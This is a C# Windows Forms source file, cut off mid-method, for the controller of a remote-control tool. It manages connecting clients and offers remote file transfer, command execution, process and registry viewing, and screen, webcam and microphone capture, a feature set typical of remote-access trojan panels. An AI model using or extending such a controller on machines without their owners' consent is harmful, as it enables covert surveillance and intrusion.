using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Server
{
    public partial class FrmMain : FrmBase
    {
        public const string APP_TITLE = "远程控制服务端";
        private static readonly ILog Logger = LogManager.GetLogger(typeof(FrmMain));
        private int clientCount = 0;
        private TreeNode InternetTreeNode { get { return this.treeView1.Nodes[1]; } }
        private SocketSession currentSession = null;
        private Dictionary<string, Action<ResponseStartGetScreen>> sessionScreenHandlers = new Dictionary<string, Action<ResponseStartGetScreen>>();
        private Dictionary<string, Action<ResponseStartCaptureVideo>> sessionVideoHandlers = new Dictionary<string, Action<ResponseStartCaptureVideo>>();
        private SendCommandHotKey sendCommandHotKey = SendCommandHotKey.Enter;
        private WaveOut _waveOut = null;

        public FrmMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = APP_TITLE;
            Control.CheckForIllegalCrossThreadCalls = false;
            initSkinMenus();
            initIcons();
            initServerEvents();
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandRequest);
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandResponse);
            actChangeSkin(Settings.CurrentSettings.SkinPath);
            if (WaveOut.Devices.Length > 0)
            {
                _waveOut = new WaveOut(WaveOut.Devices[0], 8000, 16, 1);
            }
        }

        private void initSkinMenus()
        {
            RSCApplication.lstSkins = RSCApplication.GetAllSkinFiles();
            if (RSCApplication.lstSkins.Count > 0)
            {
                int iSkinCount = RSCApplication.lstSkins.Count;
                for (int i = 0; i < iSkinCount; i++)
                {
                    string sSkinFile = RSCApplication.lstSkins[i];
                    string sSkinName = System.IO.Path.GetFileName(sSkinFile);
                    ToolStripMenuItem menuSkin = new ToolStripMenuItem(sSkinName, null, (o, e) =>
                        {
                            ToolStripMenuItem m = o as ToolStripMenuItem;
                            string sFile = m.Tag as string;
                            actChangeSkin(sFile);
                        });
                    menuSkin.Tag = sSkinFile;
                    this.ToolStripMenuItemSkins.DropDownItems.Add(menuSkin);
                }
            }
            var tools = RSCApplication.GetAllTools();
            if (tools.Count > 0)
            {
                for (int i = 0; i < tools.Count; i++)
                {
                    string tool = tools[i];
                    string menuText = System.IO.Path.GetFileNameWithoutExtension(tool);
                    Bitmap bmp = System.Drawing.Icon.ExtractAssociatedIcon(tool).ToBitmap();
                    ToolStripMenuItem menuItem = new ToolStripMenuItem(menuText, bmp, (o, e) =>
                    {
                        ToolStripMenuItem m = o as ToolStripMenuItem;
                        string sFile = m.Tag as string;
                        ProcessUtil.Run(sFile, "", false);
                    });
                    menuItem.Tag = tool;
                    this.ToolStripMenuItemTools.DropDownItems.Add(menuItem);
                }
            }

            Dictionary<ePathType, string> paths = new Dictionary<ePathType,string>();
            paths.Add(ePathType.APP_DIR, "根目录");
            paths.Add(ePathType.AVATAR_DIR,"头像目录");
            paths.Add(ePathType.SKINS_DIR,"皮肤目录");
            paths.Add(ePathType.TOOL_DIR,"工具目录");
            foreach (var pair in paths)
	        {
                string path = RSCApplication.GetPath(pair.Key);
                string menuText = pair.Value;
                ToolStripMenuItem menuItem = new ToolStripMenuItem(menuText, null, (o, e) =>
                {
                    ToolStripMenuItem m = o as ToolStripMenuItem;
                    string sFile = m.Tag as string;
                    ProcessUtil.RunByCmdStart("explorer.exe", sFile, true);
                    //ProcessUtil.Run("explorer.exe", sFile, false);
                });
                menuItem.Tag = path;
                this.ToolStripMenuItemUsualFolders.DropDownItems.Add(menuItem);
	        }
        }

        private void initIcons()
        {
            string sFileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\shell32.dll";
            int iIconCount = Win32API.ExtractIconEx(sFileName, -1, null, null, 0);
            IntPtr[] pLargeIcons = new IntPtr[iIconCount];
            IntPtr[] pSmallIcons = new IntPtr[iIconCount];
            Win32API.ExtractIconEx(sFileName, 0, pLargeIcons, pSmallIcons, iIconCount);
            for (int i = 0; i < iIconCount; i++)
			{
                this.imageList1.Images.Add(Icon.FromHandle(pLargeIcons[i]));
			}

            Dictionary<string,View> viewDic = new Dictionary<string,View>();
            viewDic.Add("大图标", View.LargeIcon);
            viewDic.Add("详情", View.Details);
            viewDic.Add("小图标", View.SmallIcon);
            viewDic.Add("列表", View.List);
            viewDic.Add("平铺", View.Tile);
            this.toolStripSplitButton1.Click += (o, args) => this.toolStripSplitButton1.ShowDropDown();
            foreach (var viewItem in viewDic)
	        {
                ToolStripItem tsi = this.toolStripSplitButton1.DropDownItems.Add(viewItem.Key, null, (o, args) =>
                    {
                        ToolStripItem i = o as ToolStripItem;
                        View v = (View)i.Tag;
                        this.listView1.View = v;
                    });
                tsi.Tag = viewItem.Value;
	        }

            var avatars = RSCApplication.GetAllAvatarFiles();
            for (int i = 0; i < avatars.Count; i++)
            {
                string avatarPath = avatars[i];
                string avatarFileName = System.IO.Path.GetFileName(avatarPath);
                this.imageList2.Images.Add(avatarFileName, Image.FromFile(avatarPath));
            }
        }

        private void initServerEvents()
        {
            RSCApplication.oRemoteControlServer = new RemoteControlServer();
            RSCApplication.oRemoteControlServer.ClientConnected += oRemoteControlServer_ClientConnected;
            RSCApplication.oRemoteControlServer.ClientDisconnected += oRemoteControlServer_ClientDisconnected;
            RSCApplication.oRemoteControlServer.PacketReceived += oRemoteControlServer_PacketReceived;
        }

        void oRemoteControlServer_PacketReceived(object sender, PacketReceivedEventArgs e)
        {
            //Console.WriteLine(e.PacketType.ToString());
            ResponseBase rb = e.Obj as ResponseBase;
            if (rb != null && rb.Result == false)
            {
                Logger.Debug(e.Session.SocketId + " Error:" + rb.Message + "\r\n" + rb.Detail);
                doOutput(rb.Message);
                return;
            }

            if (e.PacketType == ePacketType.PACKET_CLIENT_CLOSE_RESPONSE)
            {
                e.Session.Close();
            }
            else if (e.PacketType == ePacketType.PACKET_GET_HOST_NAME_RESPONSE)
            {
                var resp = e.Obj as ResponseGetHostName;
                string hostName = resp.HostName;
                e.Session.SetHostName(hostName);
                e.Session.SetAppPath(resp.AppPath);
                e.Session.SetOnlineAvatar(resp.OnlineAvatar);
                if (this.currentSession != null &&
                    this.currentSession.SocketId == e.Session.SocketId)
                {
                    // 更新主机名
                    this.Invoke(new Action(() =>
                    {
                        this.toolStripTextBox2.Text = hostName;
                    }));
                }
                this.Invoke(new Action(() =>
                {
                    // 修改节点图标
                    TreeNode node = FindClientNode(e.Session);
                    if (node != null && this.treeView1.ImageList.Images.ContainsKey(e.Session.OnlineAvatar))
                    {
                        node.ImageKey = e.Session.OnlineAvatar;
                        node.SelectedImageKey = e.Session.OnlineAvatar;
                    }
                }));
            }

            // 过滤非当前会话
            if (this.currentSession == null || e.Session.SocketId != this.currentSession.SocketId)
                return;

            if (e.PacketType == ePacketType.PACKET_GET_DRIVES_RESPONSE)
            {
                ResponseGetDrives resp = e.Obj as ResponseGetDrives;
                this.UpdateUI(() =>
                {
                    this.listView1.Items.Clear();
                    for (int i = 0; i < resp.drives.Count; i++)
                    {
                        string drive = resp.drives[i];
                        ListViewItem item = new ListViewItem(string.Concat(new object[] { drive, "", "" }), 7);
                        ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                        tag.IsFile = false;
                        tag.Path = drive;
                        item.Tag = tag;
                        this.listView1.Items.Add(item);
                    }

                });
            }
            else if (e.PacketType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE)
            {
                ResponseGetSubFilesOrDirs resp = e.Obj as ResponseGetSubFilesOrDirs;
                this.UpdateUI(() =>
                    {
                        this.listView1.Items.Clear();
                        for (int i = 0; i < resp.dirs.Count; i++)
                        {
                            var dirObj = resp.dirs[i];
                            string path = dirObj.DirPath;
                            string itemText = System.IO.Path.GetFileName(path);
                            ListViewItem item = new ListViewItem(new string[] { itemText, "", dirObj.LastWriteTime.ToString(),"<文件夹>" }, 3);
                            ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                            tag.IsFile = false;
                            tag.Path = path;
                            item.Tag = tag;
                            this.listView1.Items.Add(item);
                        }
                        for (int i = 0; i < resp.files.Count; i++)
                        {
                            var fileObj = resp.files[i];
                            string path = fileObj.FilePath;
                            string itemText = System.IO.Path.GetFileName(path);
                            string extension = System.IO.Path.GetExtension(path).ToLower();
                            if (!this.imageList1.Images.ContainsKey(extension))
                            {
                                this.imageList1.Images.Add(extension, CommonUtil.GetIcon(extension, true));
                            }
                            ListViewItem item = new ListViewItem(new string[] { itemText, GetFileSizeDesc(fileObj.Size), fileObj.LastWriteTime.ToString(),"<文件>" }, extension);
                            ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                            tag.IsFile = true;
                            tag.Path = path;
                            item.Tag = tag;
                            this.listView1.Items.Add(item);
                        }
                    });
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
            {
                if (sessionScreenHandlers.ContainsKey(e.Session.SocketId))
                {
                    var screenHandle = sessionScreenHandlers[e.Session.SocketId];
                    screenHandle(e.Obj as ResponseStartGetScreen);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                if (sessionVideoHandlers.ContainsKey(e.Session.SocketId))
                {
                    var videoHandle = sessionVideoHandlers[e.Session.SocketId];
                    videoHandle(e.Obj as ResponseStartCaptureVideo);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE)
            {
                ResponseCreateFileOrDir resp = e.Obj as ResponseCreateFileOrDir;
                if (resp.Result == false)
                {
                    doOutput(resp.Path + "创建失败，" + resp.Path);
                }

                string path = resp.Path;
                string itemText = System.IO.Path.GetFileName(path);
                ListViewItem item = new ListViewItem(string.Concat(new object[] { itemText, "", "" }), resp.PathType == Protocals.ePathType.File ? 152 : 3);
                ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                tag.IsFile = resp.PathType == Protocals.ePathType.File;
                tag.Path = path;
                item.Tag = tag;
                this.listView1.Items.Add(item);
            }
            else if (e.PacketType == ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE)
            {
                ResponseDeleteFileOrDir resp = e.Obj as ResponseDeleteFileOrDir;
                if (resp.Result == false)
                {
                    doOutput(resp.Path + "删除失败，" + resp.Path);
                }

                for (int i = this.listView1.Items.Count - 1; i >= 0; i--)
                {
                    var tag = this.listView1.Items[i].Tag as ListViewItemFileOrDirTag;
                    if (resp.Path == tag.Path)
                    {
                        this.listView1.Items.RemoveAt(i);
                    }
                }
            }
            else if (e.PacketType == ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE)
            {
                ResponseStartDownloadHeader downloadHeader = e.Obj as ResponseStartDownloadHeader;

                string fileName = System.IO.Path.GetFileName(downloadHeader.Path);
                this.DownloadHeader = downloadHeader;

                new Thread(() =>
                {
                    var frm = new FrmDownload(() => 
                    {
                        this.currentSession.Send(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, null);
                    }, downloadHeader.Path, downloadHeader.SavePath, downloadHeader.FileSize);
                    this.DownloadWindow = frm;
                    this.UpdateDownloadProgressAction = frm.UpdateProgress;
                    frm.ShowDialog();
                }) { IsBackground = true }.Start();
            }
            else if (e.PacketType == ePacketType.PACKET_START_DOWNLOAD_RESPONSE)
            {
                try
                {
                    string localFull = this.DownloadHeader.SavePath;
                    if (!System.IO.File.Exists(localFull))
                    {
                        System.IO.File.Create(localFull).Close();
                    }
                    byte[] data = e.Obj as byte[];
                    if (downloadFileStream == null)
                    {
                        downloadFileStream = new FileStream(localFull, FileMode.Open, FileAccess.Write);
                    }
                    downloadFileStream.Write(data, 0, data.Length);

                    this.recvSize += data.Length;

                    if (this.DownloadWindow!=null)
                    {
                        this.DownloadWindow.UpdateProgress(this.recvSize); 
                    }

                    if (this.recvSize == this.DownloadHeader.FileSize)
                    {
                        this.DownloadWindow.Close();
                        downloadFileStream.Close();
                        downloadFileStream = null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_COMMAND_RESPONSE)
            {
                ResponseCommand resp = e.Obj as ResponseCommand;
                if(resp.Result ==false)
                    return;

                this.textBoxCommandResponse.AppendText(resp.CommandResponse + "\r\n");
            }
            else if (e.PacketType == ePacketType.PACKET_GET_PROCESSES_RESPONSE)
            {
                ResponseGetProcesses resp = e.Obj as ResponseGetProcesses;

                new Thread(() => 
                {
                    UpdateProcessListView(resp);

                }) { IsBackground=true }.Start();
            }
            else if (e.PacketType == ePacketType.PACKET_COPY_FILE_OR_DIR_RESPONSE)
            {
                var resp = e.Obj as ResponseCopyFile;
                doOutput("复制" + resp.SourceFile + "成功!");
            }
            else if (e.PacketType == ePacketType.PACKET_MOVE_FILE_OR_DIR_RESPONSE)
            {
                var resp = e.Obj as ResponseMoveFile;
                doOutput("移动" + resp.SourceFile + "成功!");
            }
            else if (e.PacketType == ePacketType.PACKET_VIEW_REGISTRY_KEY_RESPONSE)
            {
                // 查看注册表项
                var resp = e.Obj as ResponseViewRegistryKey;
                this.UpdateUI(() =>
                {
                    try
                    {
                        // 清除右侧value值列表
                        this.listView2.Items.Clear();
                        if (resp.KeyNames != null)
                        {
                            TreeView tv = this.treeView2;
                            // 查找根节点
                            TreeNode rootNode = null;
                            for (int j = 0; j < tv.Nodes[0].Nodes.Count; j++)
                            {
                                TreeNode node = tv.Nodes[0].Nodes[j];
                                string str = node.Tag.ToString();
                                eRegistryHive erh = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), str);
                                if (erh == resp.KeyRoot)
                                {
                                    rootNode = node;
                                    break;
                                }
                            }
                            if (rootNode == null)
                            {
                                doOutput("未找到Registry根节点");
                                return;
                            }
                            TreeNode curNode = rootNode;
                            if (resp.KeyPath != null)
                            {
                                // 查找目标的节点
                                string[] keyNames = resp.KeyPath.Split("\\".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                                for (int i = 0; i < keyNames.Length; i++)
                                {
                                    var keyName = keyNames[i];
                                    var found = false;
                                    for (int k = 0; k < curNode.Nodes.Count; k++)
                                    {
                                        var node = curNode.Nodes[k];
                                        if (node.Text == keyName)
                                        {
                                            found = true;
                                            curNode = node;
                                            break;
                                        }
                                    }
                                    if (!found)
                                    {
                                        TreeNode node = new TreeNode(keyName, 0, 0);
                                        List<string> curKeys = new List<string>();
                                        for (int ii = 0; ii <= i; ii++)
                                        {
                                            curKeys.Add(keyNames[ii]);
                                        }
                                        node.Tag = new RequestViewRegistryKey() {
                                            KeyRoot = resp.KeyRoot,
                                            KeyPath = string.Join("\\",curKeys)
                                        };
                                        curNode.Nodes.Add(node);
                                        curNode = node;
                                    }
                                }
                            }
                            // 清除目标节点的子节点
                            curNode.Nodes.Clear();
                            // 重新添加目标节点的子节点
                            for (int i = 0; i < resp.KeyNames.Length; i++)
                            {
                                string keyName = resp.KeyNames[i];
                                TreeNode node = new TreeNode(keyName, 0, 0);
                                string newKeyPath = resp.KeyPath + @"\" + keyName;
                                newKeyPath = newKeyPath.TrimStart('\\');
                                node.Tag = new RequestViewRegistryKey(){
                                    KeyRoot = resp.KeyRoot,
                                    KeyPath = newKeyPath
                                };
                                curNode.Nodes.Add(node);
                            }
                            curNode.Expand();
                            tv.SelectedNode = curNode;

                            this.textBoxRegistryPath.Text = "计算机\\" + resp.KeyRoot + "\\" + resp.KeyPath;
                        }
                        if (resp.ValueNames != null)
                        {
                            // 添加右侧value值列表
                            int valueNameLen = resp.ValueNames.Length;
                            for (int i = 0; i < valueNameLen; i++)
                            {
                                ListViewItem item = new ListViewItem(new string[]{
                                    resp.ValueNames[i],
                                    resp.ValueKinds[i].ToString(),
                                    resp.Values[i].ToString()
                                },resp.ValueKinds[i].ToString());
                                this.listView2.Items.Add(item);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Error("", ex);
                    }
                });
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_AUDIO_RESPONSE)
            {
                var resp = e.Obj as ResponseStartCaptureAudio;
                if (_waveOut != null)
                {
                    byte[] decodedData = G711.Decode_aLaw(resp.AudioData, 0, resp.AudioData.Length);
                    _waveOut.Play(decodedData, 0, decodedData.Length);
                }
            }
        }

        private System.IO.FileStream downloadFileStream;
        private long recvSize = 0;
        private ResponseStartDownloadHeader DownloadHeader;
        private FrmDownload DownloadWindow;
        private Action<long> UpdateDownloadProgressAction;

        void oRemoteControlServer_ClientDisconnected(object sender, ClientConnectedEventArgs e)
        {
            RemoveClient(e.Client);
        }

        void oRemoteControlServer_ClientConnected(object sender, ClientConnectedEventArgs e)
        {
            AddClient(e.Client);
        }

        private void UpdateProcessListView(ResponseGetProcesses resp)
        {
            if (resp.Result == false)
                return;

            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseGetProcesses>(UpdateProcessListView), resp);
                return;
            }
            this.listView3.Items.Clear();
            for (int i = 0; i < resp.Processes.Count; i++)
            {
                var property = resp.Processes[i];
                ListViewItem item = new ListViewItem(property.ProcessName);
                item.SubItems.Add(property.PID.ToString());
                item.SubItems.Add(property.User);
                item.SubItems.Add(property.CPURate.ToString());
                item.SubItems.Add(GetFileSizeDesc((long)(property.PrivateMemory)));
                item.SubItems.Add(property.ThreadCount.ToString());
                item.SubItems.Add(property.ExecutablePath);
                item.SubItems.Add(property.FileDescription);
                item.SubItems.Add(property.CommandLine);

                this.listView3.Items.Add(item);
            }
        }

        private void AddClient(SocketSession oClient)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<SocketSession>(AddClient), oClient);
                return;
            }
            TreeNode treeNode = new TreeNode(oClient.SocketId);
            treeNode.Tag = oClient;
            treeNode.ImageKey = "qq";
            treeNode.SelectedImageKey = "qq";
            this.InternetTreeNode.Nodes.Add(treeNode);
            this.clientCount++;
            refreshClientCountShow();
            doOutput(oClient.SocketId.ToString() + " 上线了！");
        }

        private TreeNode FindClientNode(SocketSession oClient)
        {
            for (int i = this.InternetTreeNode.Nodes.Count - 1; i >= 0; i--)
            {
                TreeNode node = this.InternetTreeNode.Nodes[i];
                SocketSession session = node.Tag as SocketSession;
                if (session != null && session.SocketId == oClient.SocketId)
                {
                    return node;
                }
            }
            return null;
        }

        private void RemoveClient(SocketSession oClient)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<SocketSession>(RemoveClient), oClient);
                return;
            }
            for (int i = this.InternetTreeNode.Nodes.Count - 1; i >= 0; i--)
            {
                TreeNode node = this.InternetTreeNode.Nodes[i];
                SocketSession session = node.Tag as SocketSession;
                if (session != null && session.SocketId == oClient.SocketId)
                {
                    this.InternetTreeNode.Nodes.RemoveAt(i);
                }
            }
            this.currentSession = null;
            this.toolStripTextBox1.Clear();
            this.toolStripTextBox2.Clear();
            this.clientCount--;
            refreshClientCountShow();
            doOutput(oClient.SocketId.ToString() + " 下线了！");
        }

        private void actChangeSkin(string sSkinFile)
        {
            //this.skiActive = false;
            this.skinEngine1.SkinFile = sSkinFile;
            Settings.CurrentSettings.SkinPath = sSkinFile;
            if (this.ToolStripMenuItemSkins != null)
            {
                for (int j = 0; j < this.ToolStripMenuItemSkins.DropDownItems.Count; j++)
                {
                    var item = this.ToolStripMenuItemSkins.DropDownItems[j] as ToolStripMenuItem;
                    if (this.ToolStripMenuItemSkins.DropDownItems[j].Tag.ToString() == Settings.CurrentSettings.SkinPath)
                    {
                        item.Checked = true;
                    }
                    else
                    {
                        item.Checked = false;
                    }
                }
            }
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            ToolStripButton tsButton = sender as ToolStripButton;
            tsButton.Checked = !tsButton.Checked;
            if (tsButton.Checked)
            {
                List<string> ips = RSCApplication.GetLocalIPV4s();
                int iServerPort = Settings.CurrentSettings.ServerPort;
                RSCApplication.oRemoteControlServer.Start(ips, iServerPort);
                this.Text = APP_TITLE + " " + string.Join(",", ips.ToArray());
                doOutput("已开启自动上线服务，端口：" + iServerPort);
            }
            else
            {
                RSCApplication.oRemoteControlServer.Stop();
                this.Text = APP_TITLE;
                doOutput("已停止自动上线服务！");
                this.clientCount = 0;
                refreshClientCountShow();
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            SocketSession session = e.Node.Tag as SocketSession;
            if (session != null)
            {
                var mousePos = Control.MousePosition;
                var tv = sender as TreeView;
                var loc = tv.PointToClient(mousePos);
                loc.Offset(10, 0);
                this.toolTip1.Show(session.HostName, tv, loc, 2000);
            }
        }

        private void treeView1_MouseHover(object sender, EventArgs e)
        {
            //var mousePos = Control.MousePosition;
            //var tv = sender as TreeView;
            //var loc = tv.PointToClient(mousePos);

            //TreeViewHitTestInfo hitTestInfo = tv.HitTest(loc);
            //if (hitTestInfo != null && hitTestInfo.Node != null)
            //{
            //    SocketSession session = hitTestInfo.Node.Tag as SocketSession;
            //    if (session != null)
            //    {
            //        loc.Offset(5, 0);
            //        this.toolTip1.Show(string.Format("{0},{1}", session.SocketId, session.HostName), tv, loc, 2000);
            //    }
            //}
        }

        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            TreeViewHitTestInfo hitTestInfo = this.treeView1.HitTest(e.Location);
            if (hitTestInfo != null && hitTestInfo.Node != null)
            {
                SocketSession session = hitTestInfo.Node.Tag as SocketSession;
                if (session != null)
                {
                    if (session != this.currentSession)
                    {
                        bool isChange = true;
                        if (this.currentSession != null)
                        {
                            if (MsgBox.ShowYesNo("是否要切换当前连接?") != System.Windows.Forms.DialogResult.Yes)
                            {
                                isChange = false;
                            }
                        }
                        if (isChange)
                        {
                            this.currentSession = session;
                            this.toolStripTextBox1.Text = session.SocketId;
                            this.toolStripTextBox2.Text = session.HostName;
                            session.Send(ePacketType.PACKET_GET_DRIVES_REQUEST, null);
                        }
                    }
                }
                else
                {
                    this.toolStripTextBox1.Text = string.Empty;
                    this.toolStripTextBox2.Text = string.Empty;
                }
            }
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            ListViewHitTestInfo hitTestInfo = this.listView1.HitTest(e.Location);
            if (hitTestInfo != null && hitTestInfo.Item != null)
            {
                ListViewItemFileOrDirTag tag = hitTestInfo.Item.Tag as ListViewItemFileOrDirTag;
                if (!tag.IsFile)
                {
                    if (this.currentSession != null)
                    {
                        this.listView1.Tag = tag.Path;
                        RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
                        req.parentDir = tag.Path;
                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
                        this.currentSession.SocketObj.Send(packet);
                    }
                }
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag != null)
            {
                string dir = this.listView1.Tag as string;
                if (this.currentSession != null)
                {
                    DirectoryInfo parentDirInfo = System.IO.Directory.GetParent(dir);
                    if (parentDirInfo != null)
                    {
                        string parent = parentDirInfo.FullName;
                        RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
                        req.parentDir = parent;
                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
                        this.currentSession.SocketObj.Send(packet);
                        this.listView1.Tag = parent;
                    }
                    else
                    {
                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_GET_DRIVES_REQUEST, null);
                        this.currentSession.SocketObj.Send(packet);
                    }
                }
            }
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.ShowInfo("请先选择客户端！");
                return;
            }
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
            {
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            }
            else
            {
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            }
            frm.Show();
        }

        private void UpdateUI(Action action)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<Action>(UpdateUI), action);
                return;
            }
            action();
        }

        private void doOutput(string sMsg)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<string>(doOutput), sMsg);
                return;
            }
            this.richTextBox1.Text = DateTime.Now.ToString("yyyy/mm/dd HH:mm:ss") + " " + sMsg + "\r\n" + this.richTextBox1.Text;
        }

        private void refreshClientCountShow()
        {
            this.toolStripStatusLabel1.Text = "自动上线：" + this.clientCount + "台";
        }

        /// <summary>
        /// 新建文本文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag == null)
            {
                MessageBox.Show("无法在该目录下创建文件!");
                return;
            }
            var frm = new FrmInputFileOrDir();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                return;
            if (this.currentSession != null)
            {
                RequestCreateFileOrDir req = new RequestCreateFileOrDir();
                req.PathType = Protocals.ePathType.File;
                req.Path = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.InputText);
                this.currentSession.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 新建文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton11_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag == null)
            {
                MessageBox.Show("无法在该目录下创建文件!");
                return;
            }
            var frm = new FrmInputFileOrDir();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                return;
            if (this.currentSession != null)
            {
                RequestCreateFileOrDir req = new RequestCreateFileOrDir();
                req.PathType = Protocals.ePathType.Directory;
                req.Path = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.InputText);
                this.currentSession.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 删除文件或文件件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            if (MessageBox.Show("确定要删除选择项?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Cancel)
                return;

            if (this.currentSession != null)
            {
                ListViewItem selectedItem = this.listView1.SelectedItems[0];
                ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;

                RequestDeleteFileOrDir req = new RequestDeleteFileOrDir();
                req.PathType = tag.IsFile ? Protocals.ePathType.File : Protocals.ePathType.Directory;
                req.Path = tag.Path;
                this.currentSession.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 上传文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton13_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
                return;

            string remoteFileDir = this.listView1.Tag as string;
            if (remoteFileDir == null)
            {
                MsgBox.ShowInfo("当前目录无法上传文件!");
                return;
            }

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            if (ofd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                return;

            string localFilePath = ofd.FileName;
            if (remoteFileDir.EndsWith("\\"))
                remoteFileDir = remoteFileDir.TrimEnd('\\');
            string remoteFilePath = remoteFileDir + "\\" + System.IO.Path.GetFileName(localFilePath);
            RequestStartUploadHeader req = new RequestStartUploadHeader();
            req.From = localFilePath;
            req.To = remoteFilePath;
            string fileId = Guid.NewGuid().ToString();
            req.Id = fileId;
            this.currentSession.Send(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, req);

            FileStream fs = new FileStream(localFilePath, FileMode.Open, FileAccess.Read);
            uploadDic.Add(fileId, fs);
            long fileSize = fs.Length;

            var frm = new FrmDownload(() =>
                {
                    RequestStopUpload reqStop = new RequestStopUpload();
                    reqStop.Id = fileId;
                    this.currentSession.Send(ePacketType.PACKET_STOP_UPLOAD_REQUEST, reqStop);
                }, localFilePath, remoteFilePath, fileSize);
            uploadFrmDic.Add(fileId, frm);
            frm.Text = "上传文件";

            new Thread(() =>
            {
                frm.ShowDialog();
            }) { IsBackground = true }.Start();

            new Thread(() => { DoUploadFileInternal(fileId); }) { IsBackground = true }.Start();
        }

        private Dictionary<string, FileStream> uploadDic = new Dictionary<string, FileStream>();
        private Dictionary<string, FrmDownload> uploadFrmDic = new Dictionary<string, FrmDownload>();
        private void DoUploadFileInternal(string fileId)
        {
            if (uploadDic.ContainsKey(fileId))
            {
                FileStream fs = uploadDic[fileId];
                FrmDownload frm = uploadFrmDic[fileId]; 
                if (fs != null)
                {
                    byte[] buffer = new byte[2048];
                    int totalSize = 0;
                    while (true)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;

                        if (!uploadDic.ContainsKey(fileId))
                        {
                            break;
                        }
                        byte[] data = new byte[size];
                        for (int i = 0; i < size; i++)
                        {
                            data[i] = buffer[i];
                        }
                        ResponseStartUpload resp = new ResponseStartUpload();
                        resp.Id = fileId;
                        resp.Data = data;

                        this.currentSession.Send(ePacketType.PACKET_START_UPLOAD_RESPONSE, resp);

                        totalSize += size;
                        frm.UpdateProgress(totalSize);
                    }

                    RequestStopUpload reqStop = new RequestStopUpload();
                    reqStop.Id = fileId;
                    this.currentSession.Send(ePacketType.PACKET_STOP_UPLOAD_REQUEST, reqStop);
                    uploadDic.Remove(fileId);

                    fs.Close();
